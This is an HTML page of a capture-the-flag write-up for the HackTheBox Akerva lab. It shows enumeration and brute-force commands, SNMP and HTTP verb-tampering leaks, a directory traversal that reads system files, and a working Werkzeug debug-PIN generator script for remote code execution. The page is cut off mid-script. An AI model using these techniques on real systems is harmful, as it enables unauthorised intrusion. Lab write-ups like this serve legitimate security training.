@@ -1,0 +1,502 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="http://localhost:1337/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="http://localhost:1337/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="http://localhost:1337/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="http://localhost:1337/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/zoom.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/app.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Nmap TCP Enumeration &gt; sudo nmap -sC -sV -oN akerva.nmap $(getTarget) ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) ... 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) ... 5000/tcp open http Werkzeug httpd 0.16.0 (Python …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="CTF: HackTheBox Akerva Fortress"/>
+  <meta property="og:description" content="Nmap TCP Enumeration &gt; sudo nmap -sC -sV -oN akerva.nmap $(getTarget) ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) ... 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) ... 5000/tcp open http Werkzeug httpd 0.16.0 (Python …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="http://localhost:1337/ctf/htb/akerva.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2024-04-12 18:00:00+02:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="http://localhost:1337/author/jack69.html">
+  <meta property="article:section" content="CTF"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; CTF: HackTheBox Akerva Fortress</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="http://localhost:1337/">
+      <img src="http://localhost:1337/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="http://localhost:1337/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+      <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick="loadStorkIndex()"/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="http://localhost:1337/">Home</a>
+
+  <a href="/categories.html">Categories</a>
+  <a href="/category/cheatsheet.html">Cheatsheets</a>
+  <a href="/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="ctf/htb/akerva">CTF: HackTheBox Akerva Fortress</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#nmap-tcp-enumeration" title="Nmap TCP Enumeration">Nmap TCP Enumeration</a></li><li><a class="toc-href" href="#port-80-wordpress" title="Port 80: Wordpress">Port 80: Wordpress</a></li><li><a class="toc-href" href="#port-5000-flask" title="Port 5000: Flask">Port 5000: Flask</a></li><li><a class="toc-href" href="#nmap-udp-enumeration" title="Nmap UDP Enumeration">Nmap UDP Enumeration</a></li><li><a class="toc-href" href="#snmp" title="SNMP">SNMP</a></li><li><a class="toc-href" href="#port-80-http-verb-fuzzing" title="Port 80: HTTP Verb Fuzzing">Port 80: HTTP Verb Fuzzing</a></li><li><a class="toc-href" href="#port-80-backup-leak" title="Port 80: Backup Leak">Port 80: Backup Leak</a></li><li><a class="toc-href" href="#port-5000-werkzeug-pin-cracking" title="Port 5000: Werkzeug Pin Cracking">Port 5000: Werkzeug Pin Cracking</a></li><li><a class="toc-href" href="#rce-and-reverse-shell" title="RCE and Reverse Shell">RCE and Reverse Shell</a></li><li><a class="toc-href" href="#sudo-privilege-escalation" title="SUDO Privilege Escalation">SUDO Privilege Escalation</a></li><li><a class="toc-href" href="#secured-note" title="Secured Note">Secured Note</a></li></ul></div>
+        </div>
+    <h2 id="nmap-tcp-enumeration">Nmap TCP Enumeration</h2>
+<blockquote>
+<p>&gt; sudo nmap -sC -sV -oN akerva.nmap $(getTarget)<br/>
+...<br/>
+PORT     STATE SERVICE VERSION<br/>
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) <br/>
+...<br/>
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))<br/>
+...<br/>
+5000/tcp open  http    Werkzeug httpd 0.16.0 (Python 2.7.15+)<br/>
+... </p>
+</blockquote>
+<h2 id="port-80-wordpress">Port 80: Wordpress</h2>
+<p>At the port 80, a Wordpress site is hosted:</p>
+<p><img alt="wordpress-app.png" src="http://localhost:1337/images/ctf/htb/fortresses/akerva/wordpress-app.png"/></p>
+<p>Analyzing the HTML source code, the first flag is found in comments:</p>
+<p>First Flag: <code>AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}</code></p>
+<p>Using <em>wpscan</em> to enumerate vulnerable plugins and existing users:</p>
+<blockquote>
+<p>&gt; wpscan --url http://10.13.37.11/ -e vp,u  </p>
+</blockquote>
+<p>The only existing user is: <code>aas</code> ; no vulnerable plugin is found.</p>
+<p>Performing some directory bruteforce in order to discover hidden directories:</p>
+<blockquote>
+<p>&gt;gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://10.13.37.11<br/>
+/wp-content &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Status: 301)  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br/>
+<strong>/scripts</strong> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Status: 401)<br/>
+/wp-admin &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Status: 301)<br/>
+/wp-includes &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Status: 301)<br/>
+<strong>/dev</strong> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Status: 301)<br/>
+/javascript &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Status: 301)<br/>
+<strong>/backups</strong> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Status: 301)<br/>
+/server-status &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Status: 403)</p>
+</blockquote>
+<p>There are three interesting folders:</p>
+<ul>
+<li><strong>scripts</strong>: it's asking for <em>basic authentication</em> but it returns 500 for any credential provided.</li>
+<li><strong>dev</strong>: tried to enumerate sub-directories and files but nothing found.</li>
+<li><strong>backups</strong>: tried to enumerate sub-directories and files but nothing found.</li>
+</ul>
+<h2 id="port-5000-flask">Port 5000: Flask</h2>
+<p>Onto port 5000 it's likely hosted a Flask web application behind a <em>basic authentication</em>.</p>
+<p><img alt="flask-fingerprinting.png" src="http://localhost:1337/images/ctf/htb/fortresses/akerva/flask-fingerprinting.png"/></p>
+<p>Anyway, it's still possible to enumerate sub-directories and files:</p>
+<blockquote>
+<p>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt &nbsp;-u http://10.13.37.11:5000  <br/>
+/download &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Status: 401)<br/>
+/file &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Status: 401)<br/>
+/console &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Status: 200)</p>
+</blockquote>
+<p>At <strong>/console</strong> is found the Werkzeug Debug Console, but it's protected by a pin.</p>
+<p><img alt="werkzeug-pin.png" src="http://localhost:1337/images/ctf/htb/fortresses/akerva/werkzeug-pin.png"/></p>
+<p>A basic authentication brute force has been attempted using a wordlist generated from the wordpress site content:</p>
+<blockquote>
+<p>&gt; cewler -d 1 -m 4 http://10.13.37.11/ -o wordlist.txt<br/>
+...<br/>
+hydra -L wordlist.txt -P wordlist.txt -s 5000 10.13.37.11 &nbsp;http-get /  </p>
+</blockquote>
+<p>No valid credentials are found.</p>
+<h2 id="nmap-udp-enumeration">Nmap UDP Enumeration</h2>
+<p>Since TCP ports lead to nothing, a UDP port scan is performed in order to discover eventual UDP services:</p>
+<blockquote>
+<p>&gt; sudo nmap -sU -p- --min-rate 10000 10.13.37.11 -v<br/>
+... <br/>
+Scanning akerva.htb (10.13.37.11) [65535 ports]<br/>
+Discovered open port 161/udp on 10.13.37.11<br/>
+... <br/>
+PORT &nbsp;&nbsp;&nbsp;STATE SERVICE <br/>
+161/udp open &nbsp;snmp  </p>
+</blockquote>
+<p>On port 161 is exposed a <strong>snmp</strong> service.</p>
+<h2 id="snmp">SNMP</h2>
+<p>SNMP is used to collect data related to network changes or to determine the status of network-connected devices. <a href="https://www.fortra.com/resources/articles/snmp-basics-what-it-and-how-it-works">Read More</a></p>
+<p>SNMP uses read-only and read-write <strong>community strings</strong> to share information. Commmunity strings are like a credential that allows access to a router's or other device's statistics.</p>
+<p>By convention, SNMP v1 and v2c has a read-only community string set to &ldquo;<strong>public</strong>&rdquo;. It is standard practice for network managers to change all the community strings to customized values in the device setup.</p>
+<p>When SNMP is exposed, knowing the community string, it's possible to exfiltrate connected devices information by their messages and even achieve RCE when community string is read-write type.</p>
+<p>Following the command to interact with SNMP using <em>public</em> community string:</p>
+<blockquote>
+<p>&gt; snmpwalk -v2c -c public 10.13.37.11<br/>
+... <br/>
+HOST-RESOURCES-MIB::hrSWRunParameters.1242 = STRING: "/opt/check_devSite.sh"<br/>
+HOST-RESOURCES-MIB::hrSWRunParameters.1243 = STRING: "/opt/check_backup.sh" <br/>
+... <br/>
+HOST-RESOURCES-MIB::hrSWRunParameters.1246 = STRING: "/var/www/html/dev/space_dev.py"
+... <br/>
+HOST-RESOURCES-MIB::hrSWRunParameters.1247 = STRING: "/var/www/html/scripts/backup_every_17minutes.sh   AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}"<br/>
+HOST-RESOURCES-MIB::hrSWRunParameters.1252 = STRING: "/var/www/html/dev/space_dev.py"   </p>
+</blockquote>
+<p>The second flag is found passed as parameter to the <code>backup_every_17minutes.sh</code> script:  <code>AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}</code></p>
+<p>Some interesting files are found:</p>
+<ul>
+<li>/var/www/html/dev/space_dev.py</li>
+<li>/var/www/html/scripts/backup_every_17minutes.sh</li>
+</ul>
+<p>It seems that those are included respectively into <strong>/dev</strong> and <strong>/scripts</strong> web folder accessible on port 80.</p>
+<h2 id="port-80-http-verb-fuzzing">Port 80: HTTP Verb Fuzzing</h2>
+<p>Trying to access to files contained in <strong>/dev</strong> and <strong>/scripts</strong> directories:</p>
+<ul>
+<li>/dev/space_dev.py - is not accessible, receiving 403</li>
+<li>/scripts/backup_every_17minutes.sh - getting 500 for any credential given in the basic auth.</li>
+</ul>
+<p>Anyway, requesting the resource with <strong>OPTIONS</strong> method, the server responds with a 200 and the list of the allowed HTTP verbs:</p>
+<p><img alt="verbs-fuzzing.png" src="http://localhost:1337/images/ctf/htb/fortresses/akerva/verbs-fuzzing.png"/></p>
+<p>Requesting the resource with <strong>POST</strong> method leads to the leak of the script content, containing also the third flag: <code>AKERVA{IKNoW###VeRbTamper!nG_==}</code></p>
+<p><img alt="backup-script-leak.png" src="http://localhost:1337/images/ctf/htb/fortresses/akerva/backup-script-leak.png"/></p>
+<h2 id="port-80-backup-leak">Port 80: Backup Leak</h2>
+<p>The leaked backup script is the following:</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1">#</span>
+<span class="c1"># This script performs backups of production and development websites.</span>
+<span class="c1"># Backups are done every 17 minutes.</span>
+<span class="c1">#</span>
+<span class="c1"># AKERVA{IKNoW###VeRbTamper!nG_==}</span>
+<span class="c1">#</span>
+
+<span class="nv">SAVE_DIR</span><span class="o">=</span>/var/www/html/backups
+
+<span class="k">while</span><span class="w"> </span><span class="nb">true</span>
+<span class="k">do</span>
+<span class="w">    </span><span class="nv">ARCHIVE_NAME</span><span class="o">=</span>backup_<span class="k">$(</span>date<span class="w"> </span>+%Y%m%d%H%M%S<span class="k">)</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Erasing old backups..."</span>
+<span class="w">    </span>rm<span class="w"> </span>-rf<span class="w"> </span><span class="nv">$SAVE_DIR</span>/*
+
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Backuping..."</span>
+<span class="w">    </span>zip<span class="w"> </span>-r<span class="w"> </span><span class="nv">$SAVE_DIR</span>/<span class="nv">$ARCHIVE_NAME</span><span class="w"> </span>/var/www/html/*
+
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Done..."</span>
+<span class="w">    </span>sleep<span class="w"> </span><span class="m">1020</span>
+<span class="k">done</span>
+</code></pre></div>
+<p>It seems that each 17 minutes a zip is created in the <strong>/backup</strong> folder; its name will be in the form of <code>backup_YYYYmmddHMS.zip</code>. </p>
+<p>Since hours and minutes are involved, it's necessary to know the server timezone. It's possible to extract server date by mean of SMTP:</p>
+<blockquote>
+<p>&gt; snmpwalk -v2c -c public 10.13.37.11 HOST-RESOURCES-MIB::hrSystemDate.0<br/>
+HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2024-4-20,18:44:39.0,+0:0  </p>
+</blockquote>
+<p>Having the correct timezone, a wordlist of possible combinations of hours and minutes is generate with the following python script:</p>
+<div class="highlight"><pre><span></span><code><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'backup_wordlist.txt'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">minutes</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">60</span><span class="p">):</span>
+        <span class="n">minutes</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">minutes</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s2">"0"</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">seconds</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">60</span><span class="p">):</span>
+            <span class="n">seconds</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">seconds</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s2">"0"</span><span class="p">)</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">"backup_2024042018</span><span class="si">{</span><span class="n">minutes</span><span class="si">}{</span><span class="n">seconds</span><span class="si">}</span><span class="s2">.zip</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+</code></pre></div>
+<p>Then, using gobuster, the correct filename is bruteforced:</p>
+<blockquote>
+<p>&gt; gobuster dir -w ./backup_wordlist -u http://10.13.37.11/backups/</p>
+</blockquote>
+<p>In the backup, the content of the <code>/dev/space_dev.py</code> is leaked together with the fourth flag: <code>AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}</code>.</p>
+<h2 id="port-5000-werkzeug-pin-cracking">Port 5000: Werkzeug Pin Cracking</h2>
+<p>The content of the <code>/dev/space_dev.py</code> is the following:</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
+
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+<span class="kn">from</span> <span class="nn">flask_httpauth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
+<span class="kn">from</span> <span class="nn">werkzeug.security</span> <span class="kn">import</span> <span class="n">generate_password_hash</span><span class="p">,</span> <span class="n">check_password_hash</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<span class="n">auth</span> <span class="o">=</span> <span class="n">HTTPBasicAuth</span><span class="p">()</span>
+
+<span class="n">users</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">"aas"</span><span class="p">:</span> <span class="n">generate_password_hash</span><span class="p">(</span><span class="s2">"AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}"</span><span class="p">)</span>
+        <span class="p">}</span>
+
+<span class="nd">@auth</span><span class="o">.</span><span class="n">verify_password</span>
+<span class="k">def</span> <span class="nf">verify_password</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">check_password_hash</span><span class="p">(</span><span class="n">users</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">username</span><span class="p">),</span> <span class="n">password</span><span class="p">)</span>
+    <span class="k">return</span> <span class="kc">False</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
+<span class="nd">@auth</span><span class="o">.</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>
+    <span class="k">return</span> <span class="s1">'Hello, World!'</span>
+
+<span class="c1"># TODO</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/download'</span><span class="p">)</span>
+<span class="nd">@auth</span><span class="o">.</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">download</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">downloaded_file</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">"/file"</span><span class="p">)</span>
+<span class="nd">@auth</span><span class="o">.</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">file</span><span class="p">():</span>
+    <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'filename'</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s1">'error'</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+    <span class="n">modname</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="s2">"__module__"</span><span class="p">,</span> <span class="n">app</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__module__</span><span class="p">)</span>
+    <span class="n">mod</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">modname</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">modname</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="s2">"__file__"</span><span class="p">,</span> <span class="kc">None</span><span class="p">))</span>
+    <span class="nb">print</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="s1">'__name__'</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="vm">__class__</span><span class="p">,</span> <span class="s1">'__name__'</span><span class="p">)))</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="s1">'5000'</span><span class="p">,</span> <span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
+</code></pre></div>
+<p>Fourth flag is also the password for <em>aas</em> user for the basic authentication.</p>
+<p>It seems that an unrestricted directory traversal is possible using the <em>/file</em> web service. Since Flask is launched with the debug enabled and the <em>/console</em> is exposed, it's possible to abuse the directory traversal in order to obtain all the information needed to crack the PIN for the Werkzeug Console, leading to a RCE. <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">More info</a></p>
+<p>The information needed are the followings:</p>
+<ul>
+<li>username: username of the user running the process - equal to <code>aas</code></li>
+<li>modname: flask module name, generally it's equal to <code>flask.app</code></li>
+<li><code>getattr(app, '__name__', getattr(app.__class__, '__name__'))</code>: generally equal to <code>Flask</code></li>
+<li><code>getattr(mod, '__file__', None)</code>: it's the absolute path to flask app module - equal to <code>/usr/local/lib/python2.7/dist-packages/flask/app.pyc</code> (<code>.../app.py</code> didn't work)</li>
+<li><code>/sys/class/net/ens33/address</code>: MAC address of the interface on which the app is listening - equal to <code>345052365358</code></li>
+<li><code>/etc/machine-id</code>: equal to <code>258f132cd7e647caaf5510e3aca997c1</code></li>
+</ul>
+<p>The following script generates the PIN using the information previously retrieved:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+<span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">'aas'</span><span class="p">,</span>  <span class="c1"># username</span>
+    <span class="s1">'flask.app'</span><span class="p">,</span>  <span class="c1"># modname</span>
+    <span class="s1">'Flask'</span><span class="p">,</span>  <span class="c1"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>
+    <span class="s1">'/usr/local/lib/python2.7/dist-packages/flask/app.pyc'</span>  <span class="c1"># getattr(mod, '__file__', None),</span>
+<span class="p">]</span>
+
+<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">'345052365358'</span><span class="p">,</span>  <span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
+    <span class="s1">'258f132cd7e647caaf5510e3aca997c1'</span>  <span class="c1"># get_machine_id(), /etc/machine-id</span>
+    <span class="c1">#'802c2f84-9b04-4348-a698-958f9c9aea6c'  # get_machine_id(), /etc/machine-id</span>
+<span class="p">]</span>
+
+<span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>  <span class="c1"># Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0</span>
+<span class="c1">#h = hashlib.sha1()</span>
+<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+        <span class="k">continue</span>
+    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+        <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+<span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">'cookiesalt'</span><span class="p">)</span>
+<span class="c1"># h.update(b'shittysalt')</span>
+
+<span class="n">cookie_name</span> <span class="o">=</span> <span class="s1">'__wzd'</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
+
+<span class="n">num</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">'pinsalt'</span><span class="p">)</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">'</span><span class="si">%09d</span><span class="s1">'</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
+
+<span class="n">rv</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">rv</span> <span class="o">=</span> <span class="s1">'-'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s1">'0'</span><span class="p">)</span>
